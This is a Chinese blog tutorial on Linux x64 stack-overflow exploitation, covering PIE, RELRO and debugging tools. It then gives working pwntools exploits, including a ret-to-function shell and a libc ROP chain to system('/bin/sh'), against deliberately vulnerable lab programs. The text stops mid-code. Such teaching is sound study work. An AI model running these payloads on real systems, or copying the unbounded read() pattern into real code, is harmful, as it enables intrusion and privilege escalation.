<h3 id="PIE和PIC"><a href="#PIE和PIC" class="headerlink" title="PIE和PIC"></a>PIE和PIC</h3><p>PIE最早由RedHat的人实现，他在连接起上增加了-pie选项，这样使用-fPIE编译的对象就能通过连接器得到位置无关可执行程序。fPIE和fPIC有些不同。<br>-fPIC与-fpic都是在编译时加入的选项，用于生成<strong>位置无关的代码(Position-Independent-Code)</strong>。这两个选项都是可以使代码在加载到内存时使用相对地址，所有对<strong>固定地址的访问都通过全局偏移表(GOT)</strong>来实现。-fPIC和-fpic最大的区别在于是否对GOT的大小有限制。-fPIC对GOT表大小无限制，所以如果在不确定的情况下，使用-fPIC是更好的选择。<br>-fPIE与-fpie是等价的。这个选项与-fPIC/-fpic大致相同，不同点在于：-fPIC用于生成动态库，-fPIE用与生成可执行文件。再说得直白一点：-fPIE用来生成位置无关的可执行代码。</p>
<p>PIE和ASLR不是一样的作用，ASLR只能对堆、栈,libc和mmap随机化，而不能对如代码段，数据段随机化，使用PIE+ASLR则可以对代码段和数据段随机化。<br>区别是ASLR是系统功能选项，PIE和PIC是编译器功能选项。<br>联系点在于在开启ASLR之后，PIE才会生效。<br>开启命令如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c				 &#x2F;&#x2F; 默认情况下，不开启PIE</span><br><span class="line">gcc -fpie -pie -o test test.c	 &#x2F;&#x2F; 开启PIE，此时强度为1</span><br><span class="line">gcc -fPIE -pie -o test test.c	 &#x2F;&#x2F; 开启PIE，此时为最高强度2</span><br><span class="line">gcc -fpic -o test test.c		 &#x2F;&#x2F; 开启PIC，此时强度为1，不会开启PIE</span><br><span class="line">gcc -fPIC -o test test.c		 &#x2F;&#x2F; 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></table></figure>

<h3 id="RELRO-read-only-relocation"><a href="#RELRO-read-only-relocation" class="headerlink" title="RELRO(read only relocation)"></a>RELRO(read only relocation)</h3><p>在很多时候利用漏洞时可以写的内存区域通常是黑客攻击的目标，尤其是存储函数指针的区域。 而动态链接的ELF二进制文件使用称为全局偏移表（GOT）的查找表来动态解析共享库中的函数，GOT就成为了黑客关注的目标之一，</p>
<p>GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术: read only relocation。<strong>大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域,GOT为只读.</strong>设置符号重定向表为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。如果RELRO为 “Partial RELRO”，说明我们对GOT表具有写权限。<br>开启命令如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c              &#x2F;&#x2F; 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o test test.c   &#x2F;&#x2F; 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o test test.c      &#x2F;&#x2F; 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o test test.c       &#x2F;&#x2F; 全部开启</span><br></pre></td></tr></table></figure>
<p>开启FullRELRO后写利用时就不能复写got表。</p>
<h2 id="pwn工具常见整合"><a href="#pwn工具常见整合" class="headerlink" title="pwn工具常见整合"></a>pwn工具常见整合</h2><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><p>pwntools是一个二进制利用框架,网上关于pwntools的用法教程很多，学好pwntools对于做漏洞的利用和理解漏洞有很好的帮助。可以利用pwntools库开发基于python的漏洞利用脚本。</p>
<h3 id="pycharm"><a href="#pycharm" class="headerlink" title="pycharm"></a>pycharm</h3><p>pycharm可以实时调试和编写攻击脚本，提高了写利用的效率。</p>
<ol>
<li><p>在远程主机上执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat TCP4-LISTEN:10001,fork EXEC:./linux_x64_test1</span><br></pre></td></tr></table></figure>
</li>
<li><p>用pycharm工具开发pwn代码，远程连接程序进行pwn测试。<br>需要设置环境变量 TERM=linux;TERMINFO=/etc/terminfo，并勾选 Emulate terminal in output coonsoole<br><img src="https://i.loli.net/2020/05/20/mKT2Jdgq6BHWNXs.jpg" alt="-w541"><br>然后pwntools的python脚本使用远程连接</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p = remote(<span class="string">'172.16.36.176'</span>, <span class="number">10001</span>)</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">raw_input() <span class="comment"># for debug</span></span><br><span class="line">...</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>当pwntools开发的python脚本暂停时，远程ida可以附加查看信息</p>
<h3 id="gdb附加"><a href="#gdb附加" class="headerlink" title="gdb附加"></a>gdb附加</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line">...</span><br><span class="line"><span class="comment"># Get PID(s) of target. The returned PID(s) depends on the type of target:</span></span><br><span class="line">m_pid=pwn.proc.pidof(p)[<span class="number">0</span>]</span><br><span class="line">print(<span class="string">"attach %d"</span> % m_pid)</span><br><span class="line">pwn.gdb.attach(m_pid) <span class="comment"># 链接gdb调试，先在gdb界面按下n下一步返回python控制台enter继续(两窗口同步)</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"\n##########sending payload##########\n"</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pwn.pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="gdb插件枚举"><a href="#gdb插件枚举" class="headerlink" title="gdb插件枚举"></a>gdb插件枚举</h3><p>1)PEDA - Python Exploit Development Assistance for GDB(<a href="https://github.com/longld/peda" target="_blank" rel="noopener">https://github.com/longld/peda</a>)<br>可以很清晰的查看到堆栈信息，寄存器和反汇编信息<br>git clone <a href="https://github.com/longld/peda.git" target="_blank" rel="noopener">https://github.com/longld/peda.git</a> ~/panda/peda<br>echo “source ~/panda/peda/peda.py” &gt;&gt; ~/.gdbinit</p>
<p>2)GDB Enhanced Features(<a href="https://github.com/hugsy/gef" target="_blank" rel="noopener">https://github.com/hugsy/gef</a>)<br>peda的增强版，因为它支持更多的架构(ARM, MIPS, POWERPC…)，和更加强大的模块,并且和ida联动。</p>
<p>3)libheap(查看堆信息)<br>pip3 install libheap –verbose</p>
<h3 id="EDB附加"><a href="#EDB附加" class="headerlink" title="EDB附加"></a>EDB附加</h3><p>EDB 是一个可视化的跨平台调试器，跟win上的Ollydbg很像。</p>
<h3 id="lldb插件"><a href="#lldb插件" class="headerlink" title="lldb插件"></a>lldb插件</h3><p>voltron &amp; lisa。一个拥有舒服的ui界面，一个简洁但又拥有实用功能的插件。<br><a href="https://github.com/snare/voltron/" target="_blank" rel="noopener">voltron</a><br>配合tmux会产生很好的效果，如下:<br><img src="https://i.loli.net/2020/05/20/khMaumY2D4gIsxl.jpg" alt="-w820"></p>
<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>通过几个例子来了解常见的几种保护手段和熟悉常见的攻击手法。<br>实践平台 ubuntu 14.16_x64</p>
<h3 id="实践1-栈溢出-利用溢出改变程序走向"><a href="#实践1-栈溢出-利用溢出改变程序走向" class="headerlink" title="实践1_栈溢出_利用溢出改变程序走向"></a>实践1_栈溢出_利用溢出改变程序走向</h3><h4 id="编译测试用例"><a href="#编译测试用例" class="headerlink" title="编译测试用例"></a>编译测试用例</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callsystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; system(<span class="string">"/bin/sh"</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">	read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"callsystem = %p\n"</span>, callsystem);</span><br><span class="line">write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line"><span class="comment">// /dev/stdin    fd/0</span></span><br><span class="line"><span class="comment">// /dev/stdout   fd/1</span></span><br><span class="line"><span class="comment">// /dev/stderr   fd/2</span></span><br><span class="line">	vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!bash</span></span><br><span class="line">gcc -fno-stack-protector -no-pie linux_x64_test1.c -o linux_x64_test1 -ldl //禁用栈保护</span><br></pre></td></tr></table></figure>
<p>检测如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ checksec linux_x64_test1</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>
<p>发现没有栈保护，没有CANARY保护</p>
<h4 id="生成构造的数据"><a href="#生成构造的数据" class="headerlink" title="生成构造的数据"></a>生成构造的数据</h4><p>这里用到一个脚本pattern.py来生成随机数据，来自<a href="https://github.com/SaltwaterC/sploit-tools.git" target="_blank" rel="noopener">这里</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 pattern.py create 150</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span><br></pre></td></tr></table></figure>
<h4 id="获取到溢出偏移"><a href="#获取到溢出偏移" class="headerlink" title="获取到溢出偏移"></a>获取到溢出偏移</h4><p>用lldb进行调试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~/Desktop/<span class="built_in">test</span>$ lldb linux_x64_test1</span><br><span class="line">(lldb) target create <span class="string">"linux_x64_test1"</span></span><br><span class="line">Current executable <span class="built_in">set</span> to <span class="string">'linux_x64_test1'</span> (x86_64).</span><br><span class="line">(lldb) run</span><br><span class="line">Process 117360 launched: <span class="string">'/home/panda/Desktop/test/linux_x64_test1'</span> (x86_64)</span><br><span class="line">Hello, World</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span><br><span class="line">Process 117360 stopped</span><br><span class="line">* thread <span class="comment">#1: tid = 117360, 0x00000000004005e7 linux_x64_test1`vulnerable_function + 32, name = 'linux_x64_test1', stop reason = signal SIGSEGV: invalid address (fault address: 0x0)</span></span><br><span class="line">    frame <span class="comment">#0: 0x00000000004005e7 linux_x64_test1`vulnerable_function + 32</span></span><br><span class="line">linux_x64_test1`vulnerable_function:</span><br><span class="line">-&gt;  0x4005e7 &lt;+32&gt;: retq</span><br><span class="line"></span><br><span class="line">linux_x64_test1`main:</span><br><span class="line">    0x4005e8 &lt;+0&gt;:  pushq  %rbp</span><br><span class="line">    0x4005e9 &lt;+1&gt;:  movq   %rsp, %rbp</span><br><span class="line">    0x4005ec &lt;+4&gt;:  subq   <span class="variable">$0x10</span>, %rsp</span><br><span class="line">(lldb) x/xg <span class="variable">$rsp</span>  <span class="comment"># memory read --size 8 --format x --count 8 $rsp</span></span><br><span class="line"></span><br><span class="line">0x7fffffffdd58: 0x3765413665413565</span><br><span class="line"></span><br><span class="line">python2 pattern.py offset 0x3765413665413565</span><br><span class="line">hex pattern decoded as: e5Ae6Ae7</span><br><span class="line">136</span><br></pre></td></tr></table></figure>
<p>发现 溢出字符串长度为 136+ret_address</p>
<h4 id="获取-callsystem-函数地址"><a href="#获取-callsystem-函数地址" class="headerlink" title="获取 callsystem 函数地址"></a>获取 callsystem 函数地址</h4><p>因为代码中存在辅助函数callsystem，直接获取地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~&#x2F;Desktop&#x2F;test$ nm linux_x64_test1|grep call</span><br><span class="line">00000000004005b6 T callsystem</span><br></pre></td></tr></table></figure>
<h4 id="编写并测试利用-提权"><a href="#编写并测试利用-提权" class="headerlink" title="编写并测试利用_提权"></a>编写并测试利用_提权</h4><p>pwntools是一个二进制利用框架，可以用python编写一些利用脚本，方便达到利用漏洞的目的，当然也可以用其他手段。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = pwn.process(<span class="string">"./linux_x64_test1"</span>)</span><br><span class="line"><span class="comment"># p = remote('172.16.36.174', 10002)</span></span><br><span class="line">callsystem_address = <span class="number">0x00000000004005b6</span></span><br><span class="line">payload=<span class="string">"A"</span>*<span class="number">136</span> + pwn.p64(callsystem_address)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>测试利用拿到shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~&#x2F;Desktop&#x2F;test$ python test.py </span><br><span class="line">[+] Starting local process &#39;.&#x2F;linux_x64_test1&#39;: pid 117455</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello, World</span><br><span class="line">$ whoami</span><br><span class="line">panda</span><br></pre></td></tr></table></figure>
<p>将二进制程序设置为服务端程序,后续文章不再说明</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat TCP4-LISTEN:10001,fork EXEC:./linux_x64_test1</span><br></pre></td></tr></table></figure>
<p>测试远程程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~&#x2F;Desktop&#x2F;test$ python test2.py </span><br><span class="line">[+] Opening connection to 127.0.0.1 on port 10001: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello, World</span><br><span class="line">$ whoami</span><br><span class="line">panda</span><br></pre></td></tr></table></figure>
<p>如果这个进程是root</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo socat TCP4-LISTEN:10001,fork EXEC:.&#x2F;linux_x64_test1</span><br></pre></td></tr></table></figure>
<p>测试远程程序，提权成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~&#x2F;Desktop&#x2F;test$ python test.py </span><br><span class="line">[+] Opening connection to 127.0.0.1 on port 10001: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello, World</span><br><span class="line">$ whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<h3 id="实践2-栈溢出-通过ROP绕过DEP和ASLR防护"><a href="#实践2-栈溢出-通过ROP绕过DEP和ASLR防护" class="headerlink" title="实践2_栈溢出_通过ROP绕过DEP和ASLR防护"></a>实践2_栈溢出_通过ROP绕过DEP和ASLR防护</h3><h4 id="编译测试用例-1"><a href="#编译测试用例-1" class="headerlink" title="编译测试用例"></a>编译测试用例</h4><p>开启ASLR后,libc地址会不断变化,这里先不讨论怎么获取真实system地址，用了一个辅助函数打印system地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">systemaddr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* handle = dlopen(<span class="string">"libc.so.6"</span>, RTLD_LAZY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>,dlsym(handle,<span class="string">"system"</span>));</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    systemaddr();</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!bash</span></span><br><span class="line">gcc -fno-stack-protector linux_x64_test2.c -o linux_x64_test2 -ldl //禁用栈保护</span><br></pre></td></tr></table></figure>
<p>检测如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ checksec linux_x64_test2</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>
<p>观察ASLR，运行两次,发现每次libc的system函数地址会变化，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~&#x2F;Desktop&#x2F;test$ .&#x2F;linux_x64_test2 </span><br><span class="line">0x7f9d7d71a390</span><br><span class="line">Hello, World</span><br><span class="line"></span><br><span class="line">panda@ubuntu:~&#x2F;Desktop&#x2F;test$ .&#x2F;linux_x64_test2 </span><br><span class="line">0x7fa84dc3d390</span><br><span class="line">Hello, World</span><br></pre></td></tr></table></figure>
<h4 id="ROP简介"><a href="#ROP简介" class="headerlink" title="ROP简介"></a>ROP简介</h4><p>ROP的全称为Return-oriented programming（返回导向编程）,是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行DEP和代码签名等）</p>
<h4 id="寻找ROP"><a href="#寻找ROP" class="headerlink" title="寻找ROP"></a>寻找ROP</h4><p>我们希望最后执行system(“/bin/sh”)，缓冲区溢出后传入”/bin/sh”的地址和函数system地址。<br>我们想要的x64的gadget一般如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pop rdi  // rdi=<span class="string">"/bin/sh"</span></span><br><span class="line">ret      // call system_addr</span><br><span class="line"></span><br><span class="line">pop rdi  // rdi=<span class="string">"/bin/sh"</span></span><br><span class="line">pop rax  // rax= system_addr</span><br><span class="line">call rax // call system_addr</span><br></pre></td></tr></table></figure>
<p>系统开启了aslr，只能通过相对偏移来计算gadget，在二进制中搜索，这里用到工具<a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">ROPgadget</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~&#x2F;Desktop&#x2F;test$ ROPgadget --binary linux_x64_test2 --only &quot;pop|sret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 0</span><br></pre></td></tr></table></figure>
<p>获取二进制的链接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~&#x2F;Desktop&#x2F;test$ ldd linux_x64_test2</span><br><span class="line">	linux-vdso.so.1 &#x3D;&gt;  (0x00007ffeae9ec000)</span><br><span class="line">	libdl.so.2 &#x3D;&gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libdl.so.2 (0x00007fdc0531f000)</span><br><span class="line">	libc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 (0x00007fdc04f55000)</span><br><span class="line">	&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x00007fdc05523000)</span><br></pre></td></tr></table></figure>
<p>在库中搜索 pop ret</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~&#x2F;Desktop&#x2F;test$ ROPgadget --binary &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 --only &quot;pop|ret&quot; |grep rdi</span><br><span class="line">0x0000000000020256 : pop rdi ; pop rbp ; ret</span><br><span class="line">0x0000000000021102 : pop rdi ; ret</span><br></pre></td></tr></table></figure>
<p>决定用 0x0000000000021102<br>在库中搜索 /bin/sh 字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~&#x2F;Desktop&#x2F;test$ ROPgadget --binary &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 --string &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">Strings information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x000000000018cd57 : &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
<h4 id="构造利用并测试"><a href="#构造利用并测试" class="headerlink" title="构造利用并测试"></a>构造利用并测试</h4><p>这里实现两种gadgets 实现利用目的，分别是version1和version2</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"></span><br><span class="line">libc = pwn.ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"><span class="comment"># p = pwn.process("./linux_x64_test2")</span></span><br><span class="line">p = pwn.remote(<span class="string">"127.0.0.1"</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">systema_addr_str = p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">systema_addr = int(systema_addr_str,<span class="number">16</span>)  <span class="comment"># now system addr</span></span><br><span class="line"></span><br><span class="line">binsh_static = <span class="number">0x000000000018cd57</span></span><br><span class="line">binsh2_static = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"binsh_static   = 0x%x"</span> % binsh_static)</span><br><span class="line">print(<span class="string">"binsh2_static  = 0x%x"</span> % binsh2_static)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binsh_offset = binsh2_static - libc.symbols[<span class="string">"system"</span>] <span class="comment"># offset = static1 - static2</span></span><br><span class="line">print(<span class="string">"binsh_offset   = 0x%x"</span> % binsh_offset)</span><br><span class="line"></span><br><span class="line">binsh_addr = binsh_offset + systema_addr</span><br><span class="line">print(<span class="string">"binsh_addr     = 0x%x"</span> % binsh_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># version1</span></span><br><span class="line"><span class="comment"># pop_ret_static = 0x0000000000021102 # pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pop_ret_offset = pop_ret_static - libc.symbols["system"]</span></span><br><span class="line"><span class="comment"># print("pop_ret_offset = 0x%x" % pop_ret_offset)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pop_ret_addr = pop_ret_offset + systema_addr</span></span><br><span class="line"><span class="comment"># print("pop_ret_addr   = 0x%x" % pop_ret_addr)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload="A"*136 +pwn.p64(pop_ret_addr)+pwn.p64(binsh_addr)+pwn.p64(systema_addr)</span></span><br><span class="line"><span class="comment"># binsh_addr      低   x64 第一个参数是rdi</span></span><br><span class="line"><span class="comment"># systema_addr    高</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># version2</span></span><br><span class="line">pop_pop_call_static = <span class="number">0x0000000000107419</span> <span class="comment">#  pop rax ; pop rdi ; call rax</span></span><br><span class="line">pop_pop_call_offset = pop_pop_call_static - libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">print(<span class="string">"pop_pop_call_offset = 0x%x"</span> % pop_pop_call_offset)</span><br><span class="line"></span><br><span class="line">pop_pop_call_addr = pop_pop_call_offset + systema_addr</span><br><span class="line">print(<span class="string">"pop_pop_call_addr    = 0x%x"</span> % pop_pop_call_addr)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"A"</span>*<span class="number">136</span> +pwn.p64(pop_pop_call_addr)+pwn.p64(systema_addr)+pwn.p64(binsh_addr)</span><br><span class="line"><span class="comment"># systema_addr      低   pop rax</span></span><br><span class="line"><span class="comment"># binsh_addr        高   pop rdi</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"\n##########sending payload##########\n"</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>最后测试如下:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">panda@ubuntu:~/Desktop/<span class="built_in">test</span>$ python test2.py </span><br><span class="line">[*] <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./linux_x64_test2'</span>: pid 118889</span><br><span class="line">binsh_static   = 0x18cd57</span><br><span class="line">binsh2_static  = 0x18cd57</span><br><span class="line">binsh_offset   = 0x1479c7</span><br><span class="line">binsh_addr     = 0x7fc3018ffd57</span><br><span class="line">pop_ret_offset = 0x-2428e</span><br><span class="line">pop_ret_addr   = 0x7fc301794102</span><br><span class="line"></span><br><span class="line"><span class="comment">##########sending payload##########</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello, World</span><br><span class="line">$ whoami</span><br><span class="line">panda</span><br></pre></td></tr></table></figure>
<h3 id="实践3-栈溢出-去掉辅助函数"><a href="#实践3-栈溢出-去掉辅助函数" class="headerlink" title="实践3_栈溢出_去掉辅助函数"></a>实践3_栈溢出_去掉辅助函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span 